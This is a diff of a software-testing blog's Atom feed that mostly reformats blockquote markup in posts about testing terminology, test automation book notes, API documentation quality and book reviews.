 <blockquote>
-<p>You should have a strong bias seeing the code. It will be more difficult to search for the unknowns.</p></blockquote>
+    <p>You should have a strong bias seeing the code. It will be more difficult to search for the unknowns.</p>
+</blockquote>
 <p>Oh my. I don&rsquo;t do it as often as I should, but <em>I love checking commits:</em></p>
 <ul>
 <li>Skimming through commit messages for the current build.</li>
@@ -3103,18 +3252,23 @@ There was a time when every new tester came to me during the onboarding and aske
     <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2019-10-05:/articles/2019/10/05/internal-struggle-with-language-gymnastics/</id>
     
     <summary type="html"><![CDATA[<p>During the RSTA class I asked a question about language and communications:</p>
+
 <blockquote>
-<p>On one hand, I wholly agree with the notion that we should be attentive with words. Like checking vs testing, &ldquo;quality assurance&rdquo;, and all those other things. I find myself as they say &ldquo;nit-picking&rdquo; quite often.</p>
+    <p>On one hand, I wholly agree with the notion that we should be attentive with words. Like checking vs testing, &ldquo;quality assurance&rdquo;, and all those other things. I find myself as they say &ldquo;nit-picking&rdquo; quite often.</p>
 <p>On the other hand, I also follow a rule &ldquo;if your team understands you, words don&rsquo;t matter&rdquo;. Especially, if you come to the established project with existing vocabulary. It can be bizarre and absurd (my favorite was &ldquo;bug validation&rdquo; for the process of checking bug fixes), but it&rsquo;s habitual to everyone, so you&rsquo;ll likely spend more time trying to &ldquo;reteach&rdquo; than working. And you&rsquo;ll probably fail.</p>]]></summary>
     <content type="html"><![CDATA[<p>During the RSTA class I asked a question about language and communications:</p>
+
 <blockquote>
-<p>On one hand, I wholly agree with the notion that we should be attentive with words. Like checking vs testing, &ldquo;quality assurance&rdquo;, and all those other things. I find myself as they say &ldquo;nit-picking&rdquo; quite often.</p>
+    <p>On one hand, I wholly agree with the notion that we should be attentive with words. Like checking vs testing, &ldquo;quality assurance&rdquo;, and all those other things. I find myself as they say &ldquo;nit-picking&rdquo; quite often.</p>
 <p>On the other hand, I also follow a rule &ldquo;if your team understands you, words don&rsquo;t matter&rdquo;. Especially, if you come to the established project with existing vocabulary. It can be bizarre and absurd (my favorite was &ldquo;bug validation&rdquo; for the process of checking bug fixes), but it&rsquo;s habitual to everyone, so you&rsquo;ll likely spend more time trying to &ldquo;reteach&rdquo; than working. And you&rsquo;ll probably fail.</p>
-<p>So&hellip; how to live with this contradiction?</p></blockquote>
+<p>So&hellip; how to live with this contradiction?</p>
+</blockquote>
 <p>And later:</p>
+
 <blockquote>
-<p>As I understand you, contradiction is resolved by considering how much harm it can create?</p>
-<p>That makes sense. Pain and risk analysis in practice. Even though I said that &ldquo;defect validation&rdquo; absurdity was my favorite, it wasn&rsquo;t harmful for thinking processes: we usually didn&rsquo;t even call it like that and used abbreviation &ldquo;DV&rdquo;. Or sometimes QA (grrr). I noticed that majority of non-dev colleagues don&rsquo;t even know what A stands for. Probably it&rsquo;s the reason why some testers come up with new reinterpretations like &ldquo;Advocate&rdquo; or &ldquo;Assistant&rdquo;. BTW, here is a <a href="https://thebrokentest.com/50-shades-of-quality/" class="external-link">funny example</a>.</p></blockquote>
+    <p>As I understand you, contradiction is resolved by considering how much harm it can create?</p>
+<p>That makes sense. Pain and risk analysis in practice. Even though I said that &ldquo;defect validation&rdquo; absurdity was my favorite, it wasn&rsquo;t harmful for thinking processes: we usually didn&rsquo;t even call it like that and used abbreviation &ldquo;DV&rdquo;. Or sometimes QA (grrr). I noticed that majority of non-dev colleagues don&rsquo;t even know what A stands for. Probably it&rsquo;s the reason why some testers come up with new reinterpretations like &ldquo;Advocate&rdquo; or &ldquo;Assistant&rdquo;. BTW, here is a <a href="https://thebrokentest.com/50-shades-of-quality/" class="external-link">funny example</a>.</p>
+</blockquote>
 <p>While James debated that there is no contradiction, it is there. It&rsquo;s my internal contradiction. I feel these sides of me constantly struggling; for an outside viewer it can be perceived as inconsistency.</p>
 <p>I haven&rsquo;t found resolution to this conflict yet, but it occurred to me that it is based on the conflict between characteristic testers&rsquo; nit-pickiness and my amateur linguistics studies.</p>
 <p>You see, when it comes to languages in general, my position is 100% on the side of &ldquo;all is fine as long we understand each other&rdquo;. Why?</p>
@@ -3145,8 +3299,10 @@ There was a time when every new tester came to me during the onboarding and aske
 <p>One of the best examples is an accentual system in Russian (stress). Whoever tried to learn how to pronounce Russian words would be certainly baffled how illogical it is. Natives make mistakes all the time. The reason is simple: current system is in the transition state from highly ordered and easy Proto-Slavic accent to the new someday also ordered but different accent. Yet right now transition is around 30% mark and it breaks havoc within speakers. What makes things worse are all those regulatory bodies and opinionated people who try to control this process and make you speak already obsolete way.</p>
 <hr>
 <p>I won&rsquo;t be able to stop arguing about some words. Even those who say that they are sick and tired of some common testing debates, still nit-pick on other concepts. It&rsquo;s a part of human nature which is common not only in testing community: recently I&rsquo;ve read <a href="https://www.troyhunt.com/your-api-versioning-is-wrong-which-is/" class="external-link">an article by Troy Hunt</a> about which way of API versioning is better. And the most valuable lesson from there is:</p>
+
 <blockquote>
-<p>Unfortunately this very often gets philosophical and loses sight of what the real goal should be: <strong>building software that works</strong></p></blockquote>
+    <p>Unfortunately this very often gets philosophical and loses sight of what the real goal should be: <strong>building software that works</strong></p>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
@@ -3381,13 +3537,15 @@ There was a time when every new tester came to me during the onboarding and aske
     
     <summary type="html"><![CDATA[<p>We live in the world of memes and funny pictures. Nothing wrong with that. Some companies started posting humorous content too, and, again, that&rsquo;s totally fine: I myself prefer these to dry corporate pitches. But it&rsquo;s a real shame when you see a post like this from a test agency:</p>]]></summary>
     <content type="html"><![CDATA[<p>We live in the world of memes and funny pictures. Nothing wrong with that. Some companies started posting humorous content too, and, again, that&rsquo;s totally fine: I myself prefer these to dry corporate pitches. But it&rsquo;s a real shame when you see a post like this from a test agency:</p>
+
 <blockquote>
-<p>What makes you feel more powerful:</p>
+    <p>What makes you feel more powerful:</p>
 <ul>
 <li>Money</li>
 <li>Status</li>
 <li><em>Finding bugs in other people&rsquo;s code</em></li>
-</ul></blockquote>
+</ul>
+</blockquote>
 <p>It would be dishonest to say I would never find this joke amusing. I did. Probably first half a year of being a tester, less or more. And I still hear that &ldquo;achievement unlocked ding&rdquo; in my head when I find some peculiar or very critical issue.</p>
 <p>But I most certainly don&rsquo;t feel <em>powerful.</em> Experience with software development comes with a grain of salt and a certain sadness. Each bug you discover means:</p>
 <ul>
@@ -3463,8 +3621,10 @@ There was a time when every new tester came to me during the onboarding and aske
 <li>Public documentation is there, but written in such manner that without knowing internal docs you can&rsquo;t understand a thing? Again, users won&rsquo;t be happy at all.</li>
 <li>Spelling mistakes? Not that critical if in text, but can be quite awful in schemes. Real support ticket:</li>
 </ul>
+
 <blockquote>
-<p>Your developers drink too much and it impairs their accuracy. There is an epic fail in a scheme with the name of the element <code>Pressure</code>: the first letter is a Cyrillic character and it breaks all client code generation.</p></blockquote>
+    <p>Your developers drink too much and it impairs their accuracy. There is an epic fail in a scheme with the name of the element <code>Pressure</code>: the first letter is a Cyrillic character and it breaks all client code generation.</p>
+</blockquote>
 <div class="callout note"><p>Cyrillic <code>Р/р</code>  (pronounced like &ldquo;r&rdquo;) looks exactly like Latin <code>P/p</code>.</p></div>
 <ul>
 <li>Service works fine, but error messages are not that informative? Users won&rsquo;t understand how to fix an error (and probably will open a support ticket, so you&rsquo;ll needlessly spend time resolving non-existing issue).</li>
@@ -3730,30 +3890,44 @@ There was a time when every new tester came to me during the onboarding and aske
 <p>The book is about automation in testing, but not how <em>to do</em> it &mdash; it&rsquo;s about how <em>to think</em> about it. It&rsquo;s short, just 58 pages, but very dense with ideas and Alan&rsquo;s opinions.</p>
 <p>As I am not qualified to give an opinion on automation topics (because I don&rsquo;t have much experience with it), I&rsquo;ve just gathered some notes for future referencing. Sections are divided by chapters.</p>
 <hr>
+
 <blockquote>
-<p>Sometimes, testers use programming skills to help their testing. Sometimes, that code automates some application functionality. That&rsquo;s it.</p></blockquote>
+    <p>Sometimes, testers use programming skills to help their testing. Sometimes, that code automates some application functionality. That&rsquo;s it.</p>
+</blockquote>
 <h3 id="testing-failing-to-succeed" >
   <a href="#testing-failing-to-succeed">Testing: failing to succeed</a>
 </h3>
 <p>There is a very famous concept called &ldquo;Orders of Ignorance&rdquo; introduced by Phillip Glen Armour (<a href="https://www.researchgate.net/publication/27293624_The_five_orders_of_ignorance" class="external-link">more here</a>). Chapter&rsquo;s idea is that mostly tests are done on 0OI level, but we should never forget about 2OI test. 0OI is a lack of ignorance (I know) and 2OI is a lack of awareness (I don&rsquo;t know what I don&rsquo;t know).</p>
+
 <blockquote>
-<p>0OI tests are <em>knowledge-proving</em> tests, while 2OI tests are <em>knowledge-acquiring</em> tests.</p></blockquote>
+    <p>0OI tests are <em>knowledge-proving</em> tests, while 2OI tests are <em>knowledge-acquiring</em> tests.</p>
+</blockquote>
 <h3 id="the-robots-are-taking-over" >
   <a href="#the-robots-are-taking-over">The robots are taking over</a>
 </h3>
+
 <blockquote>
-<p>Humans fail when they don&rsquo;t use automation to solve problems impossible or impractical for manual efforts.</p></blockquote>
+    <p>Humans fail when they don&rsquo;t use automation to solve problems impossible or impractical for manual efforts.</p>
+</blockquote>
+
 <blockquote>
-<p>Automation fails when it tries to do or verify something that&rsquo;s more suited for a human evaluation.</p></blockquote>
+    <p>Automation fails when it tries to do or verify something that&rsquo;s more suited for a human evaluation.</p>
+</blockquote>
 <h3 id="to-automate-" >
   <a href="#to-automate-">To automate &hellip;?</a>
 </h3>
+
 <blockquote>
-<p><em>Good</em> testers test first &mdash; or at the very least they think of tests first.</p></blockquote>
+    <p><em>Good</em> testers test first &mdash; or at the very least they think of tests first.</p>
+</blockquote>
+
 <blockquote>
-<p><em>Great</em> testers first think about how they&rsquo;re going to approach a testing problem, then figure out what&rsquo;s suitable for automation, and what&rsquo;s not suitable.</p></blockquote>
+    <p><em>Great</em> testers first think about how they&rsquo;re going to approach a testing problem, then figure out what&rsquo;s suitable for automation, and what&rsquo;s not suitable.</p>
+</blockquote>
+
 <blockquote>
-<p>You should automate 100% of the tests that <em>should be</em> automated</p></blockquote>
+    <p>You should automate 100% of the tests that <em>should be</em> automated</p>
+</blockquote>
 <p>Alan&rsquo;s heuristic when to automate: &ldquo;I&rsquo;m Bored&rdquo;</p>
 <h3 id="the-coding-tester" >
   <a href="#the-coding-tester">The coding tester</a>
@@ -3769,10 +3943,14 @@ There was a time when every new tester came to me during the onboarding and aske
 <h3 id="gui-shmooey" >
   <a href="#gui-shmooey">GUI shmooey</a>
 </h3>
+
 <blockquote>
-<p>For 95% of all software applications, directly automating the GUI is a waste of time.</p></blockquote>
+    <p>For 95% of all software applications, directly automating the GUI is a waste of time.</p>
+</blockquote>
+
 <blockquote>
-<p>For the record, I typed 99% above first, then chickened out.</p></blockquote>
+    <p>For the record, I typed 99% above first, then chickened out.</p>
+</blockquote>
 <h3 id="design-for-gui-automation" >
   <a href="#design-for-gui-automation">Design for GUI automation</a>
 </h3>
@@ -3783,10 +3961,14 @@ There was a time when every new tester came to me during the onboarding and aske
 <li>It&rsquo;s freakin&rsquo; hard to automate UI (and keep track of state, verify, etc.)</li>
 <li>Available tools are weak to moderate (this is arguable, depending on what you want to do with the tools &mdash; I&rsquo;m particularly pleased, for example, with what good testers are able to do with selenium and web driver).</li>
 </ul>
+
 <blockquote>
-<p>I love GUI automation that can automatically explore variations of a GUI based task flow.</p></blockquote>
+    <p>I love GUI automation that can automatically explore variations of a GUI based task flow.</p>
+</blockquote>
+
 <blockquote>
-<p>I like GUI automation is in stress or performance issues.</p></blockquote>
+    <p>I like GUI automation is in stress or performance issues.</p>
+</blockquote>
 <h3 id="its-probably-a-design-problem" >
   <a href="#its-probably-a-design-problem">It&rsquo;s (probably) a design problem</a>
 </h3>
@@ -3807,15 +3989,21 @@ There was a time when every new tester came to me during the onboarding and aske
 <h3 id="test-design-for-automation" >
   <a href="#test-design-for-automation">Test design for automation</a>
 </h3>
+
 <blockquote>
-<p>The first step &mdash; and most important &mdash; is to think how you&rsquo;re going to test.</p></blockquote>
+    <p>The first step &mdash; and most important &mdash; is to think how you&rsquo;re going to test.</p>
+</blockquote>
+
 <blockquote>
-<p>From that initial test design effort, you can deduce what aspects of testing could be accomplished more efficiently with automation (and without).</p></blockquote>
+    <p>From that initial test design effort, you can deduce what aspects of testing could be accomplished more efficiently with automation (and without).</p>
+</blockquote>
 <h3 id="orchestrating-test-automation" >
   <a href="#orchestrating-test-automation">Orchestrating test automation</a>
 </h3>
+
 <blockquote>
-<p>Designing good tests is one of the hardest tasks in software development.</p></blockquote>
+    <p>Designing good tests is one of the hardest tasks in software development.</p>
+</blockquote>
 <h3 id="lol-----ur-automashun-suckz" >
   <a href="#lol-----ur-automashun-suckz">LOL &mdash; UR AUTOMASHUN SUCKZ!</a>
 </h3>
@@ -3841,23 +4029,37 @@ There was a time when every new tester came to me during the onboarding and aske
 <h3 id="musings-on-test-design" >
   <a href="#musings-on-test-design">Musings on test design</a>
 </h3>
+
 <blockquote>
-<p>Some tests can only be run via some sort of test automation.</p></blockquote>
+    <p>Some tests can only be run via some sort of test automation.</p>
+</blockquote>
+
 <blockquote>
-<p>Some tests can only be done via human interaction.</p></blockquote>
+    <p>Some tests can only be done via human interaction.</p>
+</blockquote>
+
 <blockquote>
-<p>You can&rsquo;t effectively think about automated testing separately from human testing.</p></blockquote>
+    <p>You can&rsquo;t effectively think about automated testing separately from human testing.</p>
+</blockquote>
+
 <blockquote>
-<p>In my world, there are no such things as automated testing, exploratory testing, manual testing, etc.</p></blockquote>
+    <p>In my world, there are no such things as automated testing, exploratory testing, manual testing, etc.</p>
+</blockquote>
+
 <blockquote>
-<p>There is only testing</p></blockquote>
+    <p>There is only testing</p>
+</blockquote>
 <h3 id="beyond-regression-tests--testing-with-code" >
   <a href="#beyond-regression-tests--testing-with-code">Beyond regression tests &amp; testing with code</a>
 </h3>
+
 <blockquote>
-<p>Useful tests are tests that provide new information.</p></blockquote>
+    <p>Useful tests are tests that provide new information.</p>
+</blockquote>
+
 <blockquote>
-<p>An automation strategy that only performs regression testing is short-sighted and incomplete.</p></blockquote>
+    <p>An automation strategy that only performs regression testing is short-sighted and incomplete.</p>
+</blockquote>
 <p>How to make test useful:</p>
 <ul>
 <li>model-based testing</li>
@@ -3869,10 +4071,14 @@ There was a time when every new tester came to me during the onboarding and aske
 <h3 id="more-on-test-design" >
   <a href="#more-on-test-design">More on test design</a>
 </h3>
+
 <blockquote>
-<p>Test Design ideas are <em>endless.</em></p></blockquote>
+    <p>Test Design ideas are <em>endless.</em></p>
+</blockquote>
+
 <blockquote>
-<p>To be a <em>good</em> test designer (and tester), you need a lot of testing ideas, and you need to know how and when to apply them.</p></blockquote>
+    <p>To be a <em>good</em> test designer (and tester), you need a lot of testing ideas, and you need to know how and when to apply them.</p>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
@@ -3884,7 +4090,7 @@ There was a time when every new tester came to me during the onboarding and aske
     
     <summary type="html"><![CDATA[<p>If there is a Linux course on a platform, I&rsquo;ll always watch it. Those who know me are aware that I am using some kind of Debian-based distributive full time &mdash; I&rsquo;m not a hardcore fan, but I like it here. One might ask: why am I watching all these courses when they are mostly for beginners? Answer is simple: repetition is the mother of learning, plus there are always some tricks that you forget or can become more interesting with time.</p>]]></summary>
     <content type="html"><![CDATA[<p>If there is a Linux course on a platform, I&rsquo;ll always watch it. Those who know me are aware that I am using some kind of Debian-based distributive full time &mdash; I&rsquo;m not a hardcore fan, but I like it here. One might ask: why am I watching all these courses when they are mostly for beginners? Answer is simple: repetition is the mother of learning, plus there are always some tricks that you forget or can become more interesting with time.</p>
-<p>So it happened with <a href="https://stepic.org/course/%d0%92%d0%b2%d0%b5%d0%b4%d0%b5%d0%bd%d0%b8%d0%b5-%d0%b2-Linux-73" class="external-link">Intro to Linux</a>(ru) on Russian platform Stepic. First, I&rsquo;ve got month license for any JetBrains IDE by solving some exercises and that&rsquo;s cool. Second, cute guys from Bioinformatics Institute made me adore tmux and almost persuaded to look at vim. Almost.</p>
+<p>So it happened with <a href="https://stepic.org/course/%D0%92%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B2-Linux-73" class="external-link">Intro to Linux</a>(ru) on Russian platform Stepic. First, I&rsquo;ve got month license for any JetBrains IDE by solving some exercises and that&rsquo;s cool. Second, cute guys from Bioinformatics Institute made me adore tmux and almost persuaded to look at vim. Almost.</p>
 <p>And now as usual, some notes to not to forget. If something looks like a magic: read books or watch some course!</p>
 <hr>
 <p>Run program in background:</p>
@@ -3961,8 +4167,10 @@ There was a time when every new tester came to me during the onboarding and aske
 <li>Measurement &mdash; monitoring, useful logs, biz metrics, usefulness of tools &amp; processes</li>
 <li>Sharing &mdash; shared view of goals, problems, and benefits</li>
 </ul>
+
 <blockquote>
-<p>If you can&rsquo;t measure it, you can&rsquo;t improve it.</p></blockquote>
+    <p>If you can&rsquo;t measure it, you can&rsquo;t improve it.</p>
+</blockquote>
 <h2 id="solving-the-environment-problem" >
   <a href="#solving-the-environment-problem">Solving the environment problem</a>
 </h2>
@@ -4088,17 +4296,25 @@ There was a time when every new tester came to me during the onboarding and aske
     <content type="html"><![CDATA[<p>Recently I&rsquo;ve read a book &ldquo;Dear Evil Tester&rdquo; by Alan Richardson. The book has three parts: published letters, unpublished, essays.</p>
 <p>The first part is kick-ass. You can just quote a random sentence from it and it will be great.</p>
 <p>For instance, I really want to use this one as a personal motto:</p>
+
 <blockquote>
-<p>The only principle I&rsquo;m prepared to absolutely commit to, with absolute certainty, is that I can change my mind.</p></blockquote>
+    <p>The only principle I&rsquo;m prepared to absolutely commit to, with absolute certainty, is that I can change my mind.</p>
+</blockquote>
 <p>And this one clearly shows the moment when everything starts flying to hell:</p>
+
 <blockquote>
-<p>If a person has the power to cause the project to fail, then they can say ‘testing is not required’, at the point they make the decision to doom the project.</p></blockquote>
+    <p>If a person has the power to cause the project to fail, then they can say ‘testing is not required’, at the point they make the decision to doom the project.</p>
+</blockquote>
 <p>Oh, how often it is when a check is &ldquo;done&rdquo;, then no, not a single step back, there will be no time for restesting and rechecking:</p>
+
 <blockquote>
-<p>And as we all know, once a ‘Test Case’ is done, it can never be undone.</p></blockquote>
+    <p>And as we all know, once a ‘Test Case’ is done, it can never be undone.</p>
+</blockquote>
 <p>Guru by themselves, so classic:</p>
+
 <blockquote>
-<p>Enumerate everything that you do, and only you do, and then define ‘true’ Exploratory Testing as the specific combination of items that you enumerated</p></blockquote>
+    <p>Enumerate everything that you do, and only you do, and then define ‘true’ Exploratory Testing as the specific combination of items that you enumerated</p>
+</blockquote>
 <p>The second part wasn&rsquo;t so interesting. Yep, there are more practical and philosophical ideas, but they weren&rsquo;t <em>evil</em> enough. It also applies to the third part.</p>
 <p>Nevertheless, it&rsquo;s the book you&rsquo;ll want to reread &mdash; cute devil&rsquo;s doodles and provocative style are awesome. And you can buy it on <a href="https://leanpub.com/DearEvilTester" class="external-link">Leanpub</a>.</p>
 ]]></content>
